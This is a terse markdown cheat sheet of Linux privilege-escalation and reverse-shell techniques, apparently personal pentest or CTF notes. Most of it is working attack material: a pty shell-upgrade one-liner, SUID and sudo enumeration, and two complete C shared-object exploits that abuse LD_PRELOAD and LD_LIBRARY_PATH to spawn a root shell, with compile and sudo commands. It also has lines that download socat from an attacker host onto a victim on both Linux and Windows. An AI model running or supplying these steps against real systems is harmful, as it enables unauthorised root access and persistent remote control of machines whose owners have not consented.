# PrivEscalation

1. Better listener shell experience
```python -c 'import pty;pty.spawn("/bin/bash")'``` 

2. List sudo capability of the current user
```sudo -l```

3. find interesting tools that can exploit shell
```find / -perm /6000 2>/dev/null | grep '/bin'```

4. https://gtfobins.github.io/ followed the interesting tools that can exploit 

5. env_keep exploit when sudo -l and ```ddl <thetargetedprogram>``` to find its libraries

### Take advantage of LD_PRELOAD
a. compile the library.
```gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/preload.c```
```#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

b. sudo program with the LD_PRELOAD
```sudo LD_PRELOAD=/tmp/preload.so program-name-here```

### Take advantage of LD_LIBRARY_PATH
a. find the libraries used by the program
```ldd /usr/sbin/<program> #for example```

b. compile the library with one of the libraries name
```gcc -o /tmp/<libraryname> -shared -fPIC /home/user/library_path.c```
```#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

c. sudo program with the LD_LIBRARY_PATH
```sudo LD_LIBRARY_PATH=/tmp <programname>```


6. 
LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
LinEnum: https://github.com/rebootuser/LinEnum
LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
Linux Priv Checker: https://github.com/linted/linuxprivchecker


# Reverse Shell:
1. https://www.revshells.com/
2. MonkeyPenTest
3. Start webserver using python "sudo python3 -m http.server 80" then download files from victim shell 
Linux :"wget <LOCAL-IP>/socat -O /tmp/socat"
Windows: "Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe"

